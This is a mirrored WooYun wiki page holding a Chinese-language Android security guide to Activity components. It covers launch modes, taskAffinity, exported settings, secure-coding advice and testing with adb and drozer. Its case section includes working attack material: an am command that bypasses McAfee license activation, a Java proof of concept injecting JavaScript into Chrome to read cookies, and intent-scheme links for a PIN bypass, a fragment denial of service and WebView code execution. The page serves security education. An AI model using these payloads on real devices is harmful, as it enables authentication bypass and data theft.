<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh"
  lang="zh" dir="ltr" class="no-js">

<!-- Mirrored from wiki.wooyun.org/client:activity?do=edit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:25:19 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>client:activity [WooYun WiKi]</title>
  <script>(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)</script>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <link rel="shortcut icon" href="lib/tpl/bootstrap3/images/favicon.ico" />
<link rel="apple-touch-icon" href="lib/tpl/bootstrap3/images/apple-touch-icon.png" />
      <link type="text/css" rel="stylesheet" href="lib/tpl/bootstrap3/assets/bootstrap/css/bootstrap.min.css" />
    <script type="text/javascript">/*<![CDATA[*/
    var TPL_CONFIG = {"tableFullWidth":1};
  /*!]]>*/</script>
  <meta name="generator" content="DokuWiki"/>
<meta name="robots" content="noindex,nofollow"/>
<link rel="search" type="application/opensearchdescription+xml" href="http://wiki.wooyun.org/lib/exe/opensearch.php" title="WooYun WiKi"/>
<link rel="start" href="http://wiki.wooyun.org/"/>
<link rel="contents" href="http://wiki.wooyun.org/client:activity?do=index" title="网站地图"/>
<link rel="alternate" type="application/rss+xml" title="最近更改" href="http://wiki.wooyun.org/feed.php"/>
<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="http://wiki.wooyun.org/feed.php?mode=list&amp;ns=client"/>
<link rel="alternate" type="text/html" title="纯HTML" href="http://wiki.wooyun.org/_export/xhtml/client:activity"/>
<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="http://wiki.wooyun.org/_export/raw/client:activity"/>
<link rel="stylesheet" type="text/css" href="http://wiki.wooyun.org/lib/exe/css.php?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
<script type="text/javascript">/*<![CDATA[*/var NS='client';var JSINFO = {"id":"client:activity","namespace":"client","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/exe/js.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/plugins/codeprettify/google-code-prettify/run_prettify.js?lang=css"></script>
  <script type="text/javascript" src="http://wiki.wooyun.org/lib/tpl/bootstrap3/assets/bootstrap/js/bootstrap.min.js"></script>
  <style type="text/css">
    body { padding-top: 20px; }
  </style>
  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script type="text/javascript" src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
  <script type="text/javascript" src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body class="default page-on-panel">
  <!--[if lte IE 7 ]><div id="IE7"><![endif]--><!--[if IE 8 ]><div id="IE8"><![endif]-->

  <div id="dokuwiki__site" class="container">
    <div id="dokuwiki__top" class="site dokuwiki mode_edit tpl_bootstrap3    ">

      
      <!-- header -->
      <div id="dokuwiki__header">
        <nav class="navbar  navbar-default" role="navigation">

  <div class="container-fluid">

    <div class="navbar-header">

      <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>

      <a href="http://wiki.wooyun.org/WooYun WiKi"  accesskey="h" title="[H]" class="navbar-brand"><img src="http://wiki.wooyun.org/lib/tpl/bootstrap3/images/logo.png" alt="WooYun WiKi" class="pull-left" id="dw__logo" width="20" height="20" /> <span id="dw__title" >WooYun WiKi</span></a>
    </div>

    <div class="collapse navbar-collapse">

      <ul class="nav navbar-nav" id="dw__navbar">
        <li class="active">
  <a href="http://wiki.wooyun.org/WooYun WiKi" ><i class="glyphicon glyphicon-home"></i> Home</a></li>
      </ul>

      <div class="navbar-right">

        <form action="http://wiki.wooyun.org/WooYun WiKi" accept-charset="utf-8" class="search" id="dw__search" method="get" role="search"><div class="no"><input type="hidden" name="do" value="search" /><input type="text" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" /><input type="submit" value="搜索" class="button" title="搜索" /><div id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>
        <ul class="nav navbar-nav" id="dw__tools">
  <li class="dropdown">
    <a href="#" class="dropdown-toggle" data-toggle="dropdown" title="工具"><i class="glyphicon glyphicon-wrench"></i> <span class="hidden-lg hidden-md hidden-sm">工具</span> <span class="caret"></span></a>
    <ul class="dropdown-menu tools" role="menu">

      <!-- dokuwiki__usertools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-user"></i> 用户工具</li>
      
      <li class="divider"></li>

      <!-- dokuwiki__sitetools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-cog"></i> 站点工具</li>
      <li><a href="http://wiki.wooyun.org/client:activity?do=recent"  class="action recent" accesskey="r" rel="nofollow" title="最近更改 [R]"><i class="glyphicon glyphicon-list-alt"></i> 最近更改</a></li><li><a href="http://wiki.wooyun.org/client:activity?do=media&amp;ns=client"  class="action media" rel="nofollow" title="媒体管理器"><i class="glyphicon glyphicon-picture"></i> 媒体管理器</a></li><li><a href="http://wiki.wooyun.org/client:activity?do=index"  class="action index" accesskey="x" rel="nofollow" title="网站地图 [X]"><i class="glyphicon glyphicon-list"></i> 网站地图</a></li>
      <li class="divider"></li>

      <!-- dokuwiki__pagetools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-file"></i> 页面工具</li>
      <li class="active"><a href="http://wiki.wooyun.org/client:activity?do="  class="action show" accesskey="v" rel="nofollow" title="显示页面 [V]"><i class="glyphicon glyphicon-edit"></i> 显示页面</a></li><li><a href="http://wiki.wooyun.org/client:activity?do=revisions"  class="action revs" accesskey="o" rel="nofollow" title="修订记录 [O]"><i class="glyphicon glyphicon-time"></i> 修订记录</a></li><li><a href="http://wiki.wooyun.org/client:activity?do=backlink"  class="action backlink" rel="nofollow" title="反向链接"><i class="glyphicon glyphicon-link"></i> 反向链接</a></li><li><a href="#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="回到顶部 [T]"><i class="glyphicon glyphicon-chevron-up"></i> 回到顶部</a></li>
    </ul>
  </li>
</ul>

        <ul class="nav navbar-nav">
          <li>
                      </li>
                    <li><a href="http://wiki.wooyun.org/client:activity?do=login&amp;sectok=a3845e1693337b10c6abaa01a16b0594"  class="action login" rel="nofollow" title="登录"><i class="glyphicon glyphicon-log-in"></i> 登录</a></li>        </ul>

      </div>

    </div>
  </div>
</nav>
      </div>
      <!-- /header -->

      
            <div id="dw__breadcrumbs">
        <hr/>
                        <div class="breadcrumb hidden-print"><span class="bchead">您的足迹:</span> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:wafw00f"  class="breadcrumbs" title="tools:wafw00f">wafw00f</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:cisco-auditing-tool"  class="breadcrumbs" title="tools:cisco-auditing-tool">cisco-auditing-tool</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:cisco-backdoor-tool"  class="breadcrumbs" title="tools:cisco-backdoor-tool">cisco-backdoor-tool</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:whatweb"  class="breadcrumbs" title="tools:whatweb">whatweb</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:burpsuite"  class="breadcrumbs" title="tools:burpsuite">burpsuite</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:nfc_toolset"  class="breadcrumbs" title="tools:nfc_toolset">nfc_toolset</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:rfidiot_acg"  class="breadcrumbs" title="tools:rfidiot_acg">rfidiot_acg</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:rfidiot_frosch"  class="breadcrumbs" title="tools:rfidiot_frosch">rfidiot_frosch</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:rfidiot_pcsc"  class="breadcrumbs" title="tools:rfidiot_pcsc">rfidiot_pcsc</a></bdi> <span class="bcsep">•</span> <span class="curid"><bdi><a href="http://wiki.wooyun.org/tools:searchsploit"  class="breadcrumbs" title="tools:searchsploit">searchsploit</a></bdi></span></div>
                <hr/>
      </div>
      
      <p class="pageId text-right">
        <span class="label label-default">client:activity</span>
      </p>

      <div id="dw__msgarea">
              </div>

      <main class="main row" role="main">

        
        <!-- ********** CONTENT ********** -->
        <article id="dokuwiki__content" class="container" >

          <div class="panel panel-default" > 
            <div class="page group panel-body">

                                          
              <div class="pull-right hidden-print" data-spy="affix" data-offset-top="150" style="z-index:1024; top:10px; right:10px;">
                              </div>

              <!-- wikipage start -->
              
<p>
本页面只读。您可以查看源文件，但不能更改它。如果您觉得这是系统错误，请联系管理员。
</p>
    <div class="editBox" role="application">

    <div class="toolbar group">
        <div id="draft__status"></div>
        <div id="tool__bar"></div>
    </div>
    <form id="dw__editform" method="post" action="#" accept-charset="utf-8"><div class="no">
<input type="hidden" name="sectok" value="a3845e1693337b10c6abaa01a16b0594" /><input type="hidden" name="id" value="client:activity" /><input type="hidden" name="rev" value="0" /><input type="hidden" name="date" value="1437672424" /><input type="hidden" name="prefix" value="." /><input type="hidden" name="suffix" value="" /><input type="hidden" name="changecheck" value="03f13d6f8c76915165a79508985504ab" /><input type="hidden" name="target" value="section" /><textarea name="wikitext" id="wiki__text" dir="auto" class="edit" cols="80" rows="10" tabindex="1" readonly="readonly">
====== Activity ======


==== 1、科普 ====

----


Android每一个Application都是由Activity、Service、content Provider和Broadcast Receiver等Android的基本组件所组成，其中Activity是实现应用程序的主体，它承担了大量的显示和交互工作，甚至可以理解为一个&quot;界面&quot;就是一个Activity。

Activity是为用户操作而展示的可视化用户界面。比如说，一个activity可以展示一个菜单项列表供用户选择，或者显示一些包含说明的照片。一个短消息应用程序可以包括一个用于显示做为发送对象的联系人的列表的activity，一个给选定的联系人写短信的activity以及翻阅以前的短信和改变设置的activity。尽管它们一起组成了一个内聚的用户界面，但其中每个activity都与其它的保持独立。每个都是以Activity类为基类的子类实现。

一个应用程序可以只有一个activity，或如刚才提到的短信应用程序那样，包含很多个。每个activity的作用，以及其数目，自然取决于应用程序及其设计。一般情况下，总有一个应用程序被标记为用户在应用程序启动的时候第一个看到的。从一个activity转向另一个的方式是靠当前的activity启动下一个。

==== 2、知识要点 ====

----

参考：[[http://developer.android.com/guide/components/activities.html|Activities]]

**生命周期**

![][1]

**启动方式**

显示启动

配置文件中注册组件

&lt;code java&gt;
&lt;activity android:name=&quot;.ExampleActivity&quot; android:icon=&quot;@drawable/app_icon&quot;&gt;
&lt;intent-filter&gt;
&lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
&lt;/intent-filter&gt;
&lt;/activity&gt;
&lt;/code&gt;

直接使用intent对象指定application以及activity启动

&lt;code java&gt;
Intent intent = new Intent(this, ExampleActivity.class);
startActivity(intent);
&lt;/code&gt;

&gt; 未配置intent-filter的action属性，activity只能使用显示启动。
&gt; 
&gt; 私有Activity推荐使用显示启动。

隐式启动

&lt;code java&gt;
Intent intent = new Intent(Intent.ACTION_SEND);
intent.putExtra(Intent.EXTRA_EMAIL, recipientArray);
startActivity(intent);
&lt;/code&gt;

**加载模式launch mode**

Activity有四种加载模式：

* **standard**：默认行为。每次启动一个activity，系统都会在目标task新建一个实例。
* **singleTop**:如果目标activity的实例已经存在于目标task的栈顶，系统会直接使用该实例，并调用该activity的onNewIntent()（不会重新create）
* **singleTask**:在一个新任务的栈顶创建activity的实例。如果实例已经存在，系统会直接使用该实例，并调用该activity的onNewIntent()（不会重新create）
* **singleInstance**:和&quot;singleTask&quot;类似，但在目标activity的task中不会再运行其他的activity，在那个task中永远只有一个activity。

设置的位置在AndroidManifest.xml文件中activity元素的android:launchMode 属性：

&lt;code java&gt;&lt;activity android:name=&quot;ActB&quot; android:launchMode=&quot;singleTask&quot;&gt;&lt;/activity&gt;&lt;/code&gt;


Activity launch mode 用于控制创建task和Activity实例。默认“standard“模式。Standard模式一次启动即会生成一个新的Activity实例并且不会创建新的task，被启动的Activity和启动的Activity在同一个栈中。当创建新的task时，intent中的内容有可能被恶意应用读取所以建议若无特别需求使用默认的standard模式即不配置launch mode属性。launchMode能被Intent 的flag覆盖。

**taskAffinity**

android系统中task管理Activity。Task的命名取决于root Activity的affinity。

默认情况下，app中的每个Activity都使用app的包名作为affinity。而Task的分配取决于app，故默认情况下一个app中所有的Activity属于同一task。要改变task的分配，可以在AndroidManifest.xml文件中设置affinity的值，但是这样做会有不同task启动Activity携带的intent中的信息被其他应用读取的风险。

**FLAG\_ACTIVITY\_NEW_TASK**

intent flag中一个重要的flag

启动Activity时通过setFlags()或者addFlags()方法设置intent的flags属性能够改变launch mode，FLAG\_ACTIVITY\_NEW\_TASK标记代表创建新的task（被启动的Activity既不在前台也不在后台）。FLAG\_ACTIVITY\_MULTIPLE\_TASK标记能和FLAG\_ACTIVITY\_NEW_TASK同时设置。这种情况下必会创建的task，所以intent中不应携带敏感数据。

**Task**

stack:Activity承担了大量的显示和交互工作，从某种角度上将，我们看见的应用程序就是许多个Activity的组合。为了让这许多 Activity协同工作而不至于产生混乱，Android平台设计了一种堆栈机制用于管理Activity，其遵循先进后出的原则，系统总是显示位于栈顶的Activity，位于栈顶的Activity也就是最后打开的Activity。

Task:是指将相关的Activity组合到一起，以Activity Stack的方式进行管理。从用户体验上讲，一个“应用程序”就是一个Task，但是从根本上讲，一个Task是可以有一个或多个Android Application组成的

如果用户离开一个task很长时间，系统会清理栈顶以下的activity，这样task被从新打开时，栈顶activity就被还原了。

![][2]

**Intent Selector**

多个Activity具有相同action时，当此调用此action时会弹出一个选择器供用户选择。

**权限**

android:exported


一个Activity组件能否被外部应用启动取决于此属性，设置为true时Activity可以被外部应用启动，设置为false则不能，此时Activity只能被自身app启动。（同user id或者root也能启动）

没有配置intent-filter的action属性exported默认为false（没有filter只能通过明确的类名来启动activity故相当于只有程序本身能启动），配置了intent-filter的action属性exported默认为true。

exported属性只是用于限制Activity是否暴露给其他app，通过配置文件中的权限申明也可以限制外部启动activity。

android:protectionLevel


[[http://developer.android.com/intl/zh-cn/guide/topics/manifest/permission-element.html|&lt;permission&gt;]]

![][3]

![][4]

normal:默认值。低风险权限，只要申请了就可以使用，安装时不需要用户确认。

dangerous：像WRITE\_SETTING和SEND\_SMS等权限是有风险的，因为这些权限能够用来重新配置设备或者导致话费。使用此protectionLevel来标识用户可能关注的一些权限。Android将会在安装程序时，警示用户关于这些权限的需求，具体的行为可能依据Android版本或者所安装的移动设备而有所变化。

signature：这些权限仅授予那些和本程序应用了相同密钥来签名的程序。

signatureOrSystem:与signature类似，除了一点，系统中的程序也需要有资格来访问。这样允许定制Android系统应用也能获得权限，这种保护等级有助于集成系统编译过程。

&lt;code java&gt;
&lt;!-- *** POINT 1 *** Define a permission with protectionLevel=&quot;signature&quot; --&gt;
&lt;permission
android:name=&quot;org.jssec.android.permission.protectedapp.MY_PERMISSION&quot;
android:protectionLevel=&quot;signature&quot; /&gt;
&lt;application
android:icon=&quot;@drawable/ic_launcher&quot;
android:label=&quot;@string/app_name&quot; &gt;
&lt;!-- *** POINT 2 *** For a component, enforce the permission with its permission attribute --&gt;
&lt;activity
android:name=&quot;.ProtectedActivity&quot;
android:exported=&quot;true&quot;
android:label=&quot;@string/app_name&quot;
android:permission=&quot;org.jssec.android.permission.protectedapp.MY_PERMISSION&quot; &gt;
&lt;!-- *** POINT 3 *** If the component is an activity, you must define no intent-filter --&gt;
&lt;/activity&gt;
&lt;/code&gt;

**关键方法**

* onCreate(Bundle savedInstanceState)
* setResult(int resultCode, Intent data)
* startActivity(Intent intent)
* startActivityForResult(Intent intent, int requestCode)
* onActivityResult(int requestCode, int resultCode, Intent data)
* setResult (int resultCode, Intent data)
* getStringExtra (String name)
* addFlags(int flags)
* setFlags(int flags)
* setPackage(String packageName)
* getAction()
* setAction(String action)
* getData()
* setData(Uri data)
* getExtras()
* putExtra(String name, String value)

==== 3、Activity分类 ====

----
Activity类型和使用方式决定了其风险和防御方式,故将Activity分类如下： Private、Public、Parter、In-house

![][5]

=== private activity ===


私有Activity不应被其他应用启动相对是安全的

创建activity时：

1、不指定taskAffinity //task管理activity。task的名字取决于根activity的affinity。默认设置中Activity使用包名做为affinity。task由app分配，所以一个应用的Activity在默认情况下属于相同task。跨task启动Activity的intent有可能被其他app读取到。

2、不指定lunchMode //默认standard，建议使用默认。创建新task时有可能被其他应用读取intent的内容。

3、设置exported属性为false

4、谨慎处理从intent中接收的数据，不管是否内部发送的intent

5、敏感信息只能在应用内部操作

使用activity时：

6、开启activity时不设置&lt;code&gt;FLAG\_ACTIVITY\_NEW\_TASK&lt;/code&gt;标签&lt;code&gt; //FLAG\_ACTIVITY\_NEW\_TASK&lt;/code&gt;标签用于创建新task（被启动的Activity并未在栈中）。

7、开启应用内部activity使用显示启动的方式

8、当putExtra()包含敏感信息目的应是app内的activity

9、谨慎处理返回数据，即可数据来自相同应用

=== public activity ===

公开暴露的Activity组件，可以被任意应用启动

创建activity：

1、设置exported属性为true

2、谨慎处理接收的intent

3、有返回数据时不应包含敏感信息

使用activity：

4、不应发送敏感信息

5、当收到返回数据时谨慎处理

Parter、in-house部分参阅[[http://www.jssec.org/dl/android\_securecoding\_en.pdf|Android Application Secure Design/Secure Coding Guidebook]]

**安全建议**

* app内使用的私有Activity不应配置intent-filter，如果配置了intent-filter需设置exported属性为false。
* 使用默认taskAffinity
* 使用默认launchMode
* 启动Activity时不设置intent的FLAG\_ACTIVITY\_NEW_TASK标签
* 谨慎处理接收的intent以及其携带的信息
* 签名验证内部（in-house）app
* 当Activity返回数据时候需注意目标Activity是否有泄露信息的风险
* 目的Activity十分明确时使用显示启动
* 谨慎处理Activity返回的数据，目的Activity返回的数据有可能是恶意应用伪造的
* 验证目标Activity是否恶意app，以免受到intent欺骗，可用hash签名验证
* When Providing an Asset Secondhand, the Asset should be Protected with the Same Level of Protection
* 尽可能的不发送敏感信息，应考虑到启动public Activity中intent的信息均有可能被恶意应用窃取的风险

==== 4、测试方法 ====

----
查看activity：

* 反编译查看配置文件AndroidManifest.xml中activity组件（关注配置了intent-filter的及未设置export=“false”的）
* 直接用RE打开安装后的app查看配置文件
* Drozer扫描:run app.activity.info -a packagename
* 动态查看：logcat设置filter的tag为ActivityManager

启动activity：

* adb shell：am start -a action -n package/componet
* drozer: run app.activity.start --action android.action.intent.VIEW ...
* 自己编写app调用startActiviy()或startActivityForResult()
* 浏览器intent scheme远程启动:[[http://drops.wooyun.org/tips/2893|Intent scheme URL attack]]

==== 5、案例 ====

----
**案例1：绕过本地认证**

[[http://www.wooyun.org/bugs/wooyun-2010-048502|华为网盘android客户端本地密码绕过（非root也可以）]] 

绕过McAfee的key验证，免费激活：

$ am start -a android.intent.action.MAIN -n com.wsandroid.suite/com.mcafee.main.MfeMain

![][7]

**案例2：本地拒绝服务**

[[http://www.wooyun.org/bugs/wooyun-2010-060423|快玩浏览器android客户端本地拒绝服务]]

[[http://www.wooyun.org/bugs/wooyun-2010-036581|雪球android客户端本地拒绝服务漏洞]]

[[http://www.wooyun.org/bugs/wooyun-2014-048176|Tencent Messenger(QQ) Dos vulnerability(critical)]]

[[http://www.wooyun.org/bugs/wooyun-2014-048501|Tencent WeiBo multiple Dos vulnerabilities(critical)]] 

[[http://www.wooyun.org/bugs/wooyun-2014-077688|Android原生的Settings应用存在必现崩溃问题（可造成拒绝服务攻击）]]  (涉及fragment)

**案例3：界面劫持**

[[http://www.wooyun.org/bugs/wooyun-2012-05478|android利用悬浮窗口实现界面劫持钓鱼盗号]]

**案例4：UXSS**

漏洞存在于Chrome Android版本v18.0.1025123，class &quot;com.google.android.apps.chrome.SimpleChromeActivity&quot; 允许恶意应用注入js代码到任意域. 部分 AndroidManifest.xml配置文件如下
&lt;code java&gt;
&lt;activity android:name=&quot;com.google.android.apps.chrome.SimpleChromeActivity&quot; android:launchMode=&quot;singleTask&quot; android:configChanges=&quot;keyboard|keyboardHidden|orientation|screenSize&quot;&gt;
&lt;intent-filter&gt;
&lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;
&lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
&lt;/intent-filter&gt;
&lt;/activity&gt;
&lt;/code&gt;

Class &quot;com.google.android.apps.chrome.SimpleChromeActivity&quot; 配置 &lt;intent-filter&gt;但是未设置 &quot;android:exported&quot; 为 &quot;false&quot;. 恶意应用先调用该类并设置data为” http://google.com” 再次调用时设置data为恶意js例如'javascript:alert(document.cookie)', 恶意代码将在http://google.com域中执行. &quot;com.google.android.apps.chrome.SimpleChromeActivity&quot; class 可以通过Android api或者am（activityManager）打开. POC如下
&lt;code java&gt;
public class TestActivity extends Activity {
@Override
public void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
Intent i = new Intent();
ComponentName comp = new ComponentName(
&quot;com.android.chrome&quot;,
&quot;com.google.android.apps.chrome.SimpleChromeActivity&quot;);
i.setComponent(comp);
i.setAction(&quot;android.intent.action.VIEW&quot;);
Uri data = Uri.parse(&quot;http://google.com&quot;);
i.setData(data);

startActivity(i);

try {
Thread.sleep(5000);
}
catch (Exception e) {}

data = Uri.parse(&quot;javascript:alert(document.cookie)&quot;); 
i.setData(data);

startActivity(i);
}
}
&lt;/code&gt;

**案例5：隐式启动intent包含敏感数据**

暂缺可公开案例,攻击模型如下图。

![][8]

**案例6：Fragment注入(绕过PIN+拒绝服务)**

Fragment这里只提一下，以后可能另写一篇。

&lt;code html&gt;
&lt;a href=&quot;intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end&quot;&gt;16、bypass Pin android 3.0-4.3 （selector）&lt;/a&gt;&lt;br&gt;
&lt;/code&gt;

![][9]
&lt;code html&gt;
&lt;a href=&quot;intent:#Intent;S.:android:show_fragment=XXXX;launchFlags=0x00008000;SEL;component=com.android.settings/com.android.settings.Settings;end&quot;&gt;17、fragment dos android 4.4 (selector)&lt;/a&gt;&lt;br&gt;
&lt;/code&gt;

![][10]

**案例7:webview RCE**
&lt;code html&gt;
&lt;a href=&quot;intent:#Intent;component=com.gift.android/.activity.WebViewIndexActivity;S.url=http://drops.wooyun.org/webview.html;S.title=WebView;end&quot;&gt;15、驴妈妈代码执行（fixed）&lt;/a&gt;&lt;br&gt;
&lt;/code&gt;
![][11]

![][12]
==== 6、参考 ====

----

[[http://www.jssec.org/dl/android\_securecoding\_en.pdf|Android Application Secure Design/Secure Coding Guidebook]]

[1]: http://static.wooyun.org/drops/20141117/201411171046activity_lifecycle.png
[2]: http://static.wooyun.org/drops/20141117/201411171045task2.png
[3]: http://static.wooyun.org/drops/20141117/201411171045permission.png
[4]: http://static.wooyun.org/drops/20141117/201411171045permission2.jpg
[5]: http://static.wooyun.org/drops/20141117/201411171045types.jpg
[6]: http://www.jssec.org/dl/android_securecoding_en.pdf
[7]: http://static.wooyun.org/drops/20141117/201411171045mcafee.png
[8]: http://static.wooyun.org/drops/20141117/201411171045selector.jpg
[9]: http://static.wooyun.org/drops/20141117/201411171051pin.png
[10]: http://static.wooyun.org/drops/20141117/201411171045fragdos.jpg
[11]: http://static.wooyun.org/drops/20141117/201411171051lvmm.jpg
[12]: http://static.wooyun.org/20141117/2014111703585555826.jpg</textarea>
<div id="wiki__editbar" class="editBar">
<div id="size__ctl">
</div>
</div>
</div></form>
</div>

              <!-- wikipage stop -->

                            
            </div>
          </div>

        </article>

        
      </main>

      <footer id="dokuwiki__footer" class="small hidden-print">

        <a href="javascript:void(0)" class="back-to-top hidden-print btn btn-default btn-sm" title="跳至内容>" id="back-to-top"><i class="glyphicon glyphicon-chevron-up"></i></a>

                <div class="text-center">
          <p id="dw__license">
                      </p>
                  </div>
      </footer>

      
    </div><!-- /site -->

    <div class="no"><img src="http://wiki.wooyun.org/lib/exe/indexer.php?id=client%3Aactivity&amp;1449198121" width="2" height="1" alt="" /></div>
    <div id="screen__mode" class="no">
      <span class="visible-xs"></span>
      <span class="visible-sm"></span>
      <span class="visible-md"></span>
      <span class="visible-lg"></span>
    </div>
  </div>
  <!--[if ( lte IE 7 | IE 8 ) ]></div><![endif]-->
</body>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "http://hm.baidu.com/hm.js?2e9369dace9479584f08203285c7cbce";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

<!-- Mirrored from wiki.wooyun.org/client:activity?do=edit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:25:19 GMT -->
</html>
